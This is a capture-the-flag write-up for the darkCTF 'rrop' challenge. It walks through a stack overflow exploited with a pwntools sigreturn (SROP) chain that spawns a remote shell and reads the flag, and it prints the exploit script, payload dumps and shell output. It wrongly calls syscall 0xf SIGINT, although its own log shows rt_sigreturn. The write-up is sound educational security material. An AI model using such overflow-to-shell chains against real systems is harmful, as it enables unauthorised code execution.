# Pwn/rrop
gr4n173

*You came this far using Solar Designer technique and advance technique, now you are into the gr4n173 world where you can't win just with fake rope/structure but here you should fake the signal which is turing complete.*

`ubuntu 18.04`

`nc rrop.darkarmy.xyz 7001`

File: `rrop`

This challenge was done with [`pwnscripts`](https://github.com/152334H/pwnscripts), although it's not as useful here.

## Solving
Kudos to gr4n173 for making a challenge where SIGROP is a necessity.

On the surface, everything about this challenge looks like `roprop` 3.0:
```c
int main() {
  char buf[0xd0]; // [rsp+0h] [rbp-D0h]
  nvm_init();
  nvm_timeout();
  printf(
    "Hello pwners, it's gr4n173 wired machine.\n"
    "Can you change the behaviour of a process, if so then take my Buffer  @%p, from some part of my process.\n",
    &buf);
  read(0, buf, 0x1388uLL);
}
```
The main difference here is that returning to GOT functions just doesn't work. I tried for a while to use the `roprop` exploit, but it just failed on any call to `r.printf()`.

With the original method a bust, we'll need to turn to the other things the binary provides:
```c
signed __int64 eax_rax() {
  return 0xFLL;
}
void useful_function() {
  __asm { syscall; LINUX - }
}
```
These two functions provide an `0xf` syscall. `0xf` is the SIGINT syscall, so this challenge is almost certainly a [SIGROP](http://docs.pwntools.com/en/stable/rop/rop.html#rop-sigreturn) challenge.

As the link implies, I abused pwntools to get a rop-chain running quickly:
```python
from pwnscripts import *
context.binary = 'rrop'
GOT_FUNCS = ['printf', 'read']
DIST = 0xd8

p = remote('rrop.darkarmy.xyz', 7001)
p.recvline()
buf = extract_first_hex(p.recvline())

r = ROP(context.binary)
r.raw('/bin/sh\0')
r.raw((DIST-8)*b'a')
r.execve(buf,0,0)
```
This doesn't work immediately, because `pwntools` doesn't detect the `rax` magic function:
```python
pwnlib.exception.PwnlibException: Could not satisfy setRegisters({'rax': Constant('SYS_rt_sigreturn', 0xf)})
```
We'll manually add the gadget to get that fixed:
```python
set_eax = context.binary.symbols['eax_rax'] + 4
r.gadgets[set_eax] = pwnlib.rop.gadgets.Gadget(set_eax, ['mov eax, 0xf', 'ret'], ['rax'], 0x8)
r.execve(buf,0,0)

p.sendline(r.chain())
p.interactive()
```
Now, the code passes, but...
```python
[+] Opening connection to rrop.darkarmy.xyz on port 7001: Done
[*] Loaded 15 cached gadgets for 'rrop'
[*] Using sigreturn for 'SYS_execve'
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
```
...it still doesn't work. Bummer, but why?

A `r.dump()` will show the error quickly:
```python
0x0000:   b'/bin/sh\x00' '/bin/sh\x00'
0x0008:      b'aaaaaaaa' b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
0x00d8:         0x4007dc mov eax, 0xf; ret
0x00e0:              0xf [arg0] rax = SYS_rt_sigreturn
0x00e8:         0x4007d2 syscall; ret
...
```
`pwntools` isn't used to having `mov` gadgets in its code, so it assumes that the `mov` is actually a `pop`.

Let's just monkey patch our payload to get through:

```python
payload = r.chain()
payload = payload[:0xe0] + payload[0xe8:]
p.sendline(payload)
p.interactive()
```
Simple enough.
```
[*] Switching to interactive mode
$ ls
bin
dev
flag.txt
lib
lib32
lib64
rrop
$ cat flag.txt
darkCTF{f1n4lly_y0u_f4k3_s1gn4l_fr4m3_4nd_w0n_gr4n173_w1r3d_m4ch1n3}
```
